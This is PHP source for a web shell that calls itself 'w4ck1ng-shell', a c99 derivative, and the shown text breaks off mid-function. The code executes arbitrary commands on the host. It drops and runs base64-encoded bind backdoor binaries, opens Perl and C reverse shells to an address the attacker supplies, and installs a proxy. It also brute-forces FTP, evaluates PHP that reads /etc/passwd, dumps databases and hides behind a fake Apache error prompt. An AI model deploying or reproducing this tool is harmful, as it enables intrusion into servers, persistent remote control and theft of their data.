b'<?php\r\nif (!function_exists("myshellexec"))\r\n{\r\nif(is_callable("popen")){\r\nfunction myshellexec($command) {\r\nif (!($p=popen("($command)2>&1","r"))) {\r\nreturn 126;\r\n}\r\nwhile (!feof($p)) {\r\n$line=fgets($p,1000);\r\n$out .= $line;\r\n}\r\npclose($p);\r\nreturn $out;\r\n}\r\n}else{\r\nfunction myshellexec($cmd)\r\n{\r\n global $disablefunc;\r\n $result = "";\r\n if (!empty($cmd))\r\n {\r\n  if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("\\n",$result);}\r\n  elseif (($result = `$cmd`) !== FALSE) {}\r\n  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}\r\n  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}\r\n  elseif (is_resource($fp = popen($cmd,"r")))\r\n  {\r\n   $result = "";\r\n   while(!feof($fp)) {$result .= fread($fp,1024);}\r\n   pclose($fp);\r\n  }\r\n }\r\n return $result;\r\n}\r\n}\r\n}\r\n\r\n\r\nfunction checkproxyhost(){\r\n$host = getenv("HTTP_HOST");\r\n$filename = \'/tmp/.setan/xh\';\r\nif (file_exists($filename)) {\r\n$_POST[\'proxyhostmsg\']="</br></br><center><font color=green size=3><b>Success!</b></font></br></br><a href=$host:6543>$host:6543</a></br></br><b>Note:</b> If \'$host\' have a good firewall or IDS  installed on their server, it will probably catch this or stop it from ever opening a port and you won\'t be able to connect to this proxy.</br></br></center>";\r\n} else {\r\n$_POST[\'proxyhostmsg\']="</br></br><center><font color=red size=3><b>Failed!</b></font></br></br><b>Note:</b> If for some reason we would not create and extract the need proxy files in \'/tmp\' this will make this fail.</br></br></center>";\r\n } \r\n}\r\n\r\nif (!empty($_POST[\'backconnectport\']) && ($_POST[\'use\']=="shbd"))\r\n{ \r\n $ip = gethostbyname($_SERVER["HTTP_HOST"]);\r\n $por = $_POST[\'backconnectport\'];\r\n if(is_writable(".")){\r\n cfb("shbd",$backdoor);\r\n ex("chmod 777 shbd");\r\n $cmd = "./shbd $por";\r\n exec("$cmd > /dev/null &");\r\n $scan = myshellexec("ps aux"); \r\n if(eregi("./shbd $por",$scan)){ $data = ("\\n</br></br>Process found running, backdoor setup successfully."); }elseif(eregi("./shbd $por",$scan)){ $data = ("\\n</br>Process not found running, backdoor not setup successfully."); }\r\n $_POST[\'backcconnmsg\']="To connect, use netcat and give it the command <b>\'nc $ip $por\'</b>.$data";\r\n }else{\r\n cfb("/tmp/shbd",$backdoor);\r\n ex("chmod 777 /tmp/shbd");\r\n $cmd = "./tmp/shbd $por";\r\n exec("$cmd > /dev/null &");\r\n $scan = myshellexec("ps aux"); \r\n if(eregi("./shbd $por",$scan)){ $data = ("\\n</br></br>Process found running, backdoor setup successfully."); }elseif(eregi("./shbd $por",$scan)){ $data = ("\\n</br>Process not found running, backdoor not setup successfully."); }\r\n $_POST[\'backcconnmsg\']="To connect, use netcat and give it the command <b>\'nc $ip $por\'</b>.$data";\r\n}\r\n} \r\n\r\nif (!empty($_POST[\'backconnectip\']) && !empty($_POST[\'backconnectport\']) && ($_POST[\'use\']=="Perl"))\r\n{\r\n if(is_writable(".")){\r\n cf("back",$back_connect);\r\n $p2=which("perl");\r\n $blah = ex($p2." back ".$_POST[\'backconnectip\']." ".$_POST[\'backconnectport\']." &");\r\n $_POST[\'backcconnmsg\']="Trying to connect to <b>".$_POST[\'backconnectip\']."</b> on port <b>".$_POST[\'backconnectport\']."</b>.";\r\n if (file_exists("back")) { unlink("back"); }\r\n }else{\r\n cf("/tmp/back",$back_connect);\r\n $p2=which("perl");\r\n $blah = ex($p2." /tmp/back ".$_POST[\'backconnectip\']." ".$_POST[\'backconnectport\']." &");\r\n $_POST[\'backcconnmsg\']="Trying to connect to <b>".$_POST[\'backconnectip\']."</b> on port <b>".$_POST[\'backconnectport\']."</b>.";\r\n if (file_exists("/tmp/back")) { unlink("/tmp/back"); }\r\n}\r\n} \r\n\r\nif (!empty($_POST[\'backconnectip\']) && !empty($_POST[\'backconnectport\']) && ($_POST[\'use\']=="C"))\r\n{\r\n if(is_writable(".")){\r\n cf("backc",$back_connect_c);\r\n ex("chmod 777 backc");\r\n //$blah = ex("gcc back.c -o backc");\r\n $blah = ex("./backc ".$_POST[\'backconnectip\']." ".$_POST[\'backconnectport\']." &");\r\n $_POST[\'backcconnmsg\']="Trying to connect to <b>".$_POST[\'backconnectip\']."</b> on port <b>".$_POST[\'backconnectport\']."</b>.";\r\n //if (file_exists("back.c")) { unlink("back.c"); }\r\n if (file_exists("backc")) { unlink("backc"); }\r\n }else{\r\n ex("chmod 777 /tmp/backc");\r\n cf("/tmp/backc",$back_connect_c);\r\n //$blah = ex("gcc -o /tmp/backc /tmp/back.c");\r\n $blah = ex("/tmp/backc ".$_POST[\'backconnectip\']." ".$_POST[\'backconnectport\']." &");\r\n $_POST[\'backcconnmsg\']="Trying to connect to <b>".$_POST[\'backconnectip\']."</b> on port <b>".$_POST[\'backconnectport\']."</b>.";\r\n //if (file_exists("back.c")) { unlink("back.c"); }\r\n if (file_exists("/tmp/backc")) { unlink("/tmp/backc"); } }\r\n}\r\n\r\nfunction cf($fname,$text)\r\n{\r\n $w_file=@fopen($fname,"w") or err();\r\n if($w_file)\r\n {\r\n @fputs($w_file,@base64_decode($text));\r\n @fclose($w_file);\r\n }\r\n}\r\n\r\nfunction cfb($fname,$text)\r\n{\r\n $w_file=@fopen($fname,"w") or bberr();\r\n if($w_file)\r\n {\r\n @fputs($w_file,@base64_decode($text));\r\n @fclose($w_file);\r\n }\r\n}\r\n\r\nfunction err()\r\n{\r\n$_POST[\'backcconnmsge\']="</br></br><b><font color=red size=3>Error:</font> Can\'t connect!</b>";\r\n}\r\n\r\nfunction bberr()\r\n{\r\n$_POST[\'backcconnmsge\']="</br></br><b><font color=red size=3>Error:</font> Can\'t backdoor host!</b>";\r\n}\r\n\r\nfunction which($pr)\r\n{\r\n$path = ex("which $pr");\r\nif(!empty($path)) { return $path; } else { return $pr; }\r\n}\r\nfunction ex($cfe)\r\n{\r\n $res = \'\';\r\n if (!empty($cfe))\r\n {\r\n  if(function_exists(\'exec\'))\r\n   {\r\n    @exec($cfe,$res);\r\n    $res = join("\\n",$res);\r\n   }\r\n  elseif(function_exists(\'shell_exec\'))\r\n   {\r\n    $res = @shell_exec($cfe);\r\n   }\r\n  elseif(function_exists(\'system\'))\r\n   {\r\n    @ob_start();\r\n    @system($cfe);\r\n    $res = @ob_get_contents();\r\n    @ob_end_clean();\r\n   }\r\n  elseif(function_exists(\'passthru\'))\r\n   {\r\n    @ob_start();\r\n    @passthru($cfe);\r\n    $res = @ob_get_contents();\r\n    @ob_end_clean();\r\n   }\r\n  elseif(@is_resource($f = @popen($cfe,"r")))\r\n  {\r\n   $res = "";\r\n   while(!@feof($f)) { $res .= @fread($f,1024); }\r\n   @pclose($f);\r\n  }\r\n }\r\n return $res;\r\n}\r\n\r\nini_set("memory_limit","300M");\r\nif (!function_exists("getmicrotime")) {function getmicrotime() {list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);}}\r\nif (!function_exists("file_get_contents")) { function file_get_contents($filename){ $handle = fopen($filename, "r"); $retval = fread($handle, filesize($filename)); fclose($handle);return $retval;}}\r\nerror_reporting(5);\r\n@ignore_user_abort(TRUE);\r\n@set_magic_quotes_runtime(0);\r\n$win = strtolower(substr(PHP_OS,0,3)) == "win";\r\ndefine("starttime",getmicrotime());\r\n//removed backdoor\r\nif (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$arr,$k="") {if (is_array($arr)) {foreach($arr as $k=>$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);}\r\n$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);\r\nforeach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}}\r\n$shver = "w4ck1ng-shell (Private Build v0.3)"; \r\nif (!empty($unset_surl)) {setcookie("c99sh_surl"); $surl = "";}\r\nelseif (!empty($set_surl)) {$surl = $set_surl; setcookie("c99sh_surl",$surl);}\r\nelse {$surl = $_REQUEST["c99sh_surl"]; \r\n}\r\n$surl_autofill_include = TRUE; //If TRUE then search variables with descriptors (URLs) and save it in SURL.\r\nif ($surl_autofill_include and !$_REQUEST["c99sh_surl"]) {$include = "&"; foreach (explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array("http://","https://","ssl://","ftp://","\\\\\\\\") as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name)."=".urlencode($value)."&";}}} if ($_REQUEST["surl_autofill_include"]) {$includestr .= "surl_autofill_include=1&";}}\r\nif (empty($surl))\r\n{\r\n $surl = "?".$includestr; \r\n}\r\n$surl = htmlspecialchars($surl);\r\n$timelimit = 0; //time limit of execution this script over server quote (seconds), 0 = unlimited.\r\n$login = ""; \r\n$pass = ""; \r\n$md5_pass = "";\r\n$host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")\r\n$login_txt = "Apache Error: Restricted File";\r\n$accessdeniedmess = "access denied";\r\n$gzipencode = TRUE; \r\n$filestealth = TRUE; //if TRUE, don\'t change modify- and access-time\r\n$donated_html = "";\r\n$donated_act = array(""); //array ("act1","act2,"...), if $act is in this array, display $donated_html.\r\n$curdir = "./"; \r\n//$curdir = getenv("DOCUMENT_ROOT");\r\n$tmpdir = ""; \r\n$tmpdir_log = "./"; \r\n//$log_email = "synsta@gmail.com"; \r\n$sort_default = "0a"; \r\n$sort_save = TRUE;\r\n$ftypes  = array(\r\n "html"=>array("html","htm","shtml"),\r\n "txt"=>array("txt","c",".bash_history","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),\r\n "exe"=>array("sh","install","bat","cmd"),\r\n "ini"=>array("ini","inf"),\r\n "code"=>array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),\r\n "img"=>array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),\r\n "sdb"=>array("sdb"),\r\n "phpsess"=>array("sess"),\r\n "download"=>array("exe","com","pif","src","lnk","zip","rar","gz","tar")\r\n);\r\n\r\n$exeftypes  = array(\r\n getenv("PHPRC")." -q %f%" => array("php","php3","php4"),\r\n "perl %f%" => array("pl","cgi")\r\n);\r\n$regxp_highlight  = array(\r\n  array(basename($_SERVER["PHP_SELF"]),1,"<font color=\\"yellow\\">","</font>"), // example\r\n  array("config.php",1) // example\r\n);\r\n$safemode_diskettes = array("a"); \r\n$hexdump_lines = 8;// lines in hex preview file\r\n$hexdump_rows = 24;// 16, 24 or 32 bytes in one line\r\n$nixpwdperpage = 100; // Get first N lines from /etc/passwd\r\n\r\n\r\n$sess_cookie = "c99shvars"; // Cookie-variable name\r\n\r\n\r\n\r\n//Quick launch\r\n$quicklaunch = array(\r\n array("<hr><b>[Home]</b>",$surl),\r\n array("<b>[Search]</b>",$surl."act=search&d=%d"),\r\n array("<b>[Encoder]</b>",$surl."act=encoder&d=%d"),\r\n array("<b>[Processes]</b>",$surl."act=processes&d=%d"),\r\n array("<b>[FTP Brute Forcer]</b>",$surl."act=ftpquickbrute&d=%d"),\r\n array("<b>[Server Information]</b>",$surl."act=security&d=%d"),\r\n array("<b>[SQL Manager]</b>",$surl."act=sql&d=%d"),\r\n array("<b>[Eval PHP code]</b>",$surl."act=eval&d=%d&eval=//readfile(\'/etc/passwd\');"),\r\n array("<b>[Back-Connection]</b>",$surl."act=backc"),\r\n array("<b>[Self remove]</b>",$surl."act=selfremove"),\r\n array("<b>[Install Proxy]</b>",$surl."act=proxy"),\r\n array("<b>[Backdoor Host]</b>",$surl."act=shbd"),\r\n);\r\n\r\n//Highlight-code colors\r\n$highlight_background = "#c0c0c0";\r\n$highlight_bg = "#FFFFFF";\r\n$highlight_comment = "#6A6A6A";\r\n$highlight_default = "#0000BB";\r\n$highlight_html = "#1300FF";\r\n$highlight_keyword = "#007700";\r\n$highlight_string = "#000000";\r\n\r\n@$f = $_REQUEST["f"];\r\n@extract($_REQUEST["c99shcook"]);\r\n\r\n//END CONFIGURATION\r\n\r\n\r\n// \\/Next code isn\'t for editing\\/\r\n@set_time_limit(0);\r\n$tmp = array();\r\nforeach($host_allow as $k=>$v) {$tmp[] = str_replace("\\\\*",".*",preg_quote($v));}\r\n$s = "!^(".implode("|",$tmp).")$!i";\r\nif (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("Access Denied");}\r\nif (!empty($login))\r\n{\r\n if (empty($md5_pass)) {$md5_pass = md5($pass);}\r\n if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))\r\n {\r\n  if (empty($login_txt)) {$login_txt = strip_tags(ereg_replace("&nbsp;|<br>"," ",$donated_html));}\r\n  header("WWW-Authenticate: Basic realm=\\"".$login_txt."\\"");\r\n  header("HTTP/1.0 401 Unauthorized");\r\n  exit($accessdeniedmess);\r\n }\r\n}\r\nif ($act != "img"){\r\n$lastdir = realpath(".");\r\nchdir($curdir);\r\nif ($selfwrite or $updatenow) {@ob_clean(); c99sh_getupdate($selfwrite,1); exit;}\r\n$sess_data = unserialize($_COOKIE["$sess_cookie"]);\r\nif (!is_array($sess_data)) {$sess_data = array();}\r\nif (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();}\r\nif (!is_array($sess_data["cut"])) {$sess_data["cut"] = array();}\r\n\r\n$disablefunc = @ini_get("disable_functions");\r\nif (!empty($disablefunc))\r\n{\r\n $disablefunc = str_replace(" ","",$disablefunc);\r\n $disablefunc = explode(",",$disablefunc);\r\n}\r\n\r\nif (!function_exists("c99_buff_prepare"))\r\n{\r\nfunction c99_buff_prepare()\r\n{\r\n global $sess_data;\r\n global $act;\r\n foreach($sess_data["copy"] as $k=>$v) {$sess_data["copy"][$k] = str_replace("\\\\",DIRECTORY_SEPARATOR,realpath($v));}\r\n foreach($sess_data["cut"] as $k=>$v) {$sess_data["cut"][$k] = str_replace("\\\\",DIRECTORY_SEPARATOR,realpath($v));}\r\n $sess_data["copy"] = array_unique($sess_data["copy"]);\r\n $sess_data["cut"] = array_unique($sess_data["cut"]);\r\n sort($sess_data["copy"]);\r\n sort($sess_data["cut"]);\r\n if ($act != "copy") {foreach($sess_data["cut"] as $k=>$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}\r\n else {foreach($sess_data["copy"] as $k=>$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}\r\n}\r\n}\r\nc99_buff_prepare();\r\nif (!function_exists("c99_sess_put"))\r\n{\r\nfunction c99_sess_put($data)\r\n{\r\n global $sess_cookie;\r\n global $sess_data;\r\n c99_buff_prepare();\r\n $sess_data = $data;\r\n $data = serialize($data);\r\n setcookie($sess_cookie,$data);\r\n}\r\n}\r\nforeach (array("sort","sql_sort") as $v)\r\n{\r\n if (!empty($_GET[$v])) {$$v = $_GET[$v];}\r\n if (!empty($_POST[$v])) {$$v = $_POST[$v];}\r\n}\r\nif ($sort_save)\r\n{\r\n if (!empty($sort)) {setcookie("sort",$sort);}\r\n if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);}\r\n}\r\nif (!function_exists("str2mini"))\r\n{\r\nfunction str2mini($content,$len)\r\n{\r\n if (strlen($content) > $len)\r\n {\r\n  $len = ceil($len/2) - 2;\r\n  return substr($content, 0,$len)."...".substr($content,-$len);\r\n }\r\n else {return $content;}\r\n}\r\n}\r\nif (!function_exists("view_size"))\r\n{\r\nfunction view_size($size)\r\n{\r\n if (!is_numeric($size)) {return FALSE;}\r\n else\r\n {\r\n  if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}\r\n  elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}\r\n  elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}\r\n  else {$size = $size . " B";}\r\n  return $size;\r\n }\r\n}\r\n}\r\nif (!function_exists("fs_copy_dir"))\r\n{\r\nfunction fs_copy_dir($d,$t)\r\n{\r\n $d = str_replace("\\\\",DIRECTORY_SEPARATOR,$d);\r\n if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}\r\n $h = opendir($d);\r\n while (($o = readdir($h)) !== FALSE)\r\n {\r\n  if (($o != ".") and ($o != ".."))\r\n  {\r\n   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}\r\n   else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}\r\n   if (!$ret) {return $ret;}\r\n  }\r\n }\r\n closedir($h);\r\n return TRUE;\r\n}\r\n}\r\nif (!function_exists("fs_copy_obj"))\r\n{\r\nfunction fs_copy_obj($d,$t)\r\n{\r\n $d = str_replace("\\\\",DIRECTORY_SEPARATOR,$d);\r\n $t = str_replace("\\\\",DIRECTORY_SEPARATOR,$t);\r\n if (!is_dir(dirname($t))) {mkdir(dirname($t));}\r\n if (is_dir($d))\r\n {\r\n  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}\r\n  if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}\r\n  return fs_copy_dir($d,$t);\r\n }\r\n elseif (is_file($d)) {return copy($d,$t);}\r\n else {return FALSE;}\r\n}\r\n}\r\nif (!function_exists("fs_move_dir"))\r\n{\r\nfunction fs_move_dir($d,$t)\r\n{\r\n $h = opendir($d);\r\n if (!is_dir($t)) {mkdir($t);}\r\n while (($o = readdir($h)) !== FALSE)\r\n {\r\n  if (($o != ".") and ($o != ".."))\r\n  {\r\n   $ret = TRUE;\r\n   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}\r\n   else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = FALSE;}}\r\n   if (!$ret) {return $ret;}\r\n  }\r\n }\r\n closedir($h);\r\n return TRUE;\r\n}\r\n}\r\nif (!function_exists("fs_move_obj"))\r\n{\r\nfunction fs_move_obj($d,$t)\r\n{\r\n $d = str_replace("\\\\",DIRECTORY_SEPARATOR,$d);\r\n $t = str_replace("\\\\",DIRECTORY_SEPARATOR,$t);\r\n if (is_dir($d))\r\n {\r\n  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}\r\n  if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}\r\n  return fs_move_dir($d,$t);\r\n }\r\n elseif (is_file($d))\r\n {\r\n  if(copy($d,$t)) {return unlink($d);}\r\n  else {unlink($t); return FALSE;}\r\n }\r\n else {return FALSE;}\r\n}\r\n}\r\nif (!function_exists("fs_rmdir"))\r\n{\r\nfunction fs_rmdir($d)\r\n{\r\n $h = opendir($d);\r\n while (($o = readdir($h)) !== FALSE)\r\n {\r\n  if (($o != ".") and ($o != ".."))\r\n  {\r\n   if (!is_dir($d.$o)) {unlink($d.$o);}\r\n   else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}\r\n  }\r\n }\r\n closedir($h);\r\n rmdir($d);\r\n return !is_dir($d);\r\n}\r\n}\r\nif (!function_exists("fs_rmobj"))\r\n{\r\nfunction fs_rmobj($o)\r\n{\r\n $o = str_replace("\\\\",DIRECTORY_SEPARATOR,$o);\r\n if (is_dir($o))\r\n {\r\n  if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}\r\n  return fs_rmdir($o);\r\n }\r\n elseif (is_file($o)) {return unlink($o);}\r\n else {return FALSE;}\r\n}\r\n}\r\nif (!function_exists("tabsort")) {function tabsort($a,$b) {global $v; return strnatcmp($a[$v], $b[$v]);}}\r\nif (!function_exists("view_perms"))\r\n{\r\nfunction view_perms($mode)\r\n{\r\n if (($mode & 0xC000) === 0xC000) {$type = "s";}\r\n elseif (($mode & 0x4000) === 0x4000) {$type = "d";}\r\n elseif (($mode & 0xA000) === 0xA000) {$type = "l";}\r\n elseif (($mode & 0x8000) === 0x8000) {$type = "-";}\r\n elseif (($mode & 0x6000) === 0x6000) {$type = "b";}\r\n elseif (($mode & 0x2000) === 0x2000) {$type = "c";}\r\n elseif (($mode & 0x1000) === 0x1000) {$type = "p";}\r\n else {$type = "?";}\r\n\r\n $owner["read"] = ($mode & 00400)?"r":"-";\r\n $owner["write"] = ($mode & 00200)?"w":"-";\r\n $owner["execute"] = ($mode & 00100)?"x":"-";\r\n $group["read"] = ($mode & 00040)?"r":"-";\r\n $group["write"] = ($mode & 00020)?"w":"-";\r\n $group["execute"] = ($mode & 00010)?"x":"-";\r\n $world["read"] = ($mode & 00004)?"r":"-";\r\n $world["write"] = ($mode & 00002)? "w":"-";\r\n $world["execute"] = ($mode & 00001)?"x":"-";\r\n\r\n if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}\r\n if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}\r\n if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}\r\n\r\n return $type.join("",$owner).join("",$group).join("",$world);\r\n}\r\n}\r\nif (!function_exists("posix_getpwuid") and !in_array("posix_getpwuid",$disablefunc)) {function posix_getpwuid($uid) {return FALSE;}}\r\nif (!function_exists("posix_getgrgid") and !in_array("posix_getgrgid",$disablefunc)) {function posix_getgrgid($gid) {return FALSE;}}\r\nif (!function_exists("posix_kill") and !in_array("posix_kill",$disablefunc)) {function posix_kill($gid) {return FALSE;}}\r\nif (!function_exists("parse_perms"))\r\n{\r\nfunction parse_perms($mode)\r\n{\r\n if (($mode & 0xC000) === 0xC000) {$t = "s";}\r\n elseif (($mode & 0x4000) === 0x4000) {$t = "d";}\r\n elseif (($mode & 0xA000) === 0xA000) {$t = "l";}\r\n elseif (($mode & 0x8000) === 0x8000) {$t = "-";}\r\n elseif (($mode & 0x6000) === 0x6000) {$t = "b";}\r\n elseif (($mode & 0x2000) === 0x2000) {$t = "c";}\r\n elseif (($mode & 0x1000) === 0x1000) {$t = "p";}\r\n else {$t = "?";}\r\n $o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0;\r\n $g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0;\r\n $w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0;\r\n return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w);\r\n}\r\n}\r\nif (!function_exists("parsesort"))\r\n{\r\nfunction parsesort($sort)\r\n{\r\n $one = intval($sort);\r\n $second = substr($sort,-1);\r\n if ($second != "d") {$second = "a";}\r\n return array($one,$second);\r\n}\r\n}\r\nif (!function_exists("view_perms_color"))\r\n{\r\nfunction view_perms_color($o)\r\n{\r\n if (!is_readable($o)) {return "<font color=red>".view_perms(fileperms($o))."</font>";}\r\n elseif (!is_writable($o)) {return "<font color=white>".view_perms(fileperms($o))."</font>";}\r\n else {return "<font color=green>".view_perms(fileperms($o))."</font>";}\r\n}\r\n}\r\nif (!function_exists("mysql_dump")){\r\nfunction mysql_dump($set)\r\n{\r\n global $shver;\r\n $sock = $set["sock"];\r\n $db = $set["db"];\r\n $print = $set["print"];\r\n $nl2br = $set["nl2br"];\r\n $file = $set["file"];\r\n $add_drop = $set["add_drop"];\r\n $tabs = $set["tabs"];\r\n $onlytabs = $set["onlytabs"];\r\n $ret = array();\r\n $ret["err"] = array();\r\n if (!is_resource($sock)) {echo("Error: \\$sock is not valid resource.");}\r\n if (empty($db)) {$db = "db";}\r\n if (empty($print)) {$print = 0;}\r\n if (empty($nl2br)) {$nl2br = 0;}\r\n if (empty($add_drop)) {$add_drop = TRUE;}\r\n if (empty($file))\r\n {\r\n  $file = $tmpdir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";\r\n }\r\n if (!is_array($tabs)) {$tabs = array();}\r\n if (empty($add_drop)) {$add_drop = TRUE;}\r\n if (sizeof($tabs) == 0)\r\n {\r\n  // retrive tables-list\r\n  $res = mysql_query("SHOW TABLES FROM ".$db, $sock);\r\n  if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}\r\n }\r\n $out = "# Dumped by ".$shver."\r\n# Home page: http://w4ck1ng.com\r\n#\r\n# Host settings:\r\n# MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."\r\n# Date: ".date("d.m.Y H:i:s")."\r\n# DB: \\"".$db."\\"\r\n#---------------------------------------------------------\r\n";\r\n $c = count($onlytabs);\r\n foreach($tabs as $tab)\r\n {\r\n  if ((in_array($tab,$onlytabs)) or (!$c))\r\n  {\r\n   if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\\n";}\r\n   // recieve query for create table structure\r\n   $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);\r\n   if (!$res) {$ret["err"][] = mysql_smarterror();}\r\n   else\r\n   {\r\n    $row = mysql_fetch_row($res);\r\n    $out .= $row["1"].";\\n\\n";\r\n    // recieve table variables\r\n    $res = mysql_query("SELECT * FROM `$tab`", $sock);\r\n    if (mysql_num_rows($res) > 0)\r\n    {\r\n     while ($row = mysql_fetch_assoc($res))\r\n     {\r\n      $keys = implode("`, `", array_keys($row));\r\n      $values = array_values($row);\r\n      foreach($values as $k=>$v) {$values[$k] = addslashes($v);}\r\n      $values = implode("\', \'", $values);\r\n      $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES (\'".$values."\');\\n";\r\n      $out .= $sql;\r\n     }\r\n    }\r\n   }\r\n  }\r\n }\r\n $out .= "#---------------------------------------------------------------------------------\\n\\n";\r\n if ($file)\r\n {\r\n  $fp = fopen($file, "w");\r\n  if (!$fp) {$ret["err"][] = 2;}\r\n  else\r\n  {\r\n   fwrite ($fp, $out);\r\n   fclose ($fp);\r\n  }\r\n }\r\n if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}\r\n return $out;\r\n}\r\n}\r\nif (!function_exists("mysql_buildwhere"))\r\n{\r\nfunction mysql_buildwhere($array,$sep=" and",$functs=array())\r\n{\r\n if (!is_array($array)) {$array = array();}\r\n $result = "";\r\n foreach($array as $k=>$v)\r\n {\r\n  $value = "";\r\n  if (!empty($functs[$k])) {$value .= $functs[$k]."(";}\r\n  $value .= "\'".addslashes($v)."\'";\r\n  if (!empty($functs[$k])) {$value .= ")";}\r\n  $result .= "`".$k."` = ".$value.$sep;\r\n }\r\n $result = substr($result,0,strlen($result)-strlen($sep));\r\n return $result;\r\n}\r\n}\r\nif (!function_exists("mysql_fetch_all"))\r\n{\r\nfunction mysql_fetch_all($query,$sock)\r\n{\r\n if ($sock) {$result = mysql_query($query,$sock);}\r\n else {$result = mysql_query($query);}\r\n $array = array();\r\n while ($row = mysql_fetch_array($result)) {$array[] = $row;}\r\n mysql_free_result($result);\r\n return $array;\r\n}\r\n}\r\nif (!function_exists("mysql_smarterror"))\r\n{\r\nfunction mysql_smarterror($type,$sock)\r\n{\r\n if ($sock) {$error = mysql_error($sock);}\r\n else {$error = mysql_error();}\r\n $error = htmlspecialchars($error);\r\n return $error;\r\n}\r\n}\r\nif (!function_exists("mysql_query_form"))\r\n{\r\nfunction mysql_query_form()\r\n{\r\n global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;\r\n if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}\r\n if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}\r\n if ((!$submit) or ($sql_act))\r\n {\r\n  echo "<table border=0><tr><td><form name=\\"c99sh_sqlquery\\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value=\\"".htmlspecialchars($sql_tbl)."\\"><input type=hidden name=submit value=\\"1\\"><input type=hidden name=\\"sql_goto\\" value=\\"".htmlspecialchars($sql_goto)."\\"><input type=submit name=sql_confirm value=\\"Yes\\">&nbsp;<input type=submit value=\\"No\\"></form></td>";\r\n  if ($tbl_struct)\r\n  {\r\n   echo "<td valign=\\"top\\"><b>Fields:</b><br>";\r\n   foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "\xbb <a href=\\"#\\" onclick=\\"document.c99sh_sqlquery.sql_query.value+=\'`".$name."`\';\\"><b>".$name."</b></a><br>";}\r\n   echo "</td></tr></table>";\r\n  }\r\n 